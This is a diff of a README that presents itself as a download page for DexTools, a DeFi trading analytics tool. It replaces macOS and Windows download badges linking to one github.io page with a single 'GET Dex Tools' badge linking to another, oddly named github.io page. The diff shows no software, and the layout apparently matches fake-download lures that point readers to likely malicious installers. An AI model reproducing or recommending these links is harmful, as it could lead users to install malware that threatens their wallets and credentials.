@@ -1,18 +1,7 @@
 # DexTools Download — DeFi Trading Analytics
 
-<a href="https://git-io-setup.github.io/.github/?offer=DexTools" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/DexTools%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="DexTools for macOS">
-</a>
+[![GET Dex Tools](https://img.shields.io/badge/GET%20%E2%80%94%20Dex-Tools-0078D6?style=for-the-badge&logoColor=white)](https://paveglio2000orndoff.github.io/.github/Dex-Tools)
 
-<a href="https://git-io-setup.github.io/.github/?offer=DexTools" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/DexTools%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="DexTools for Windows">
-</a>
 
 ---
 
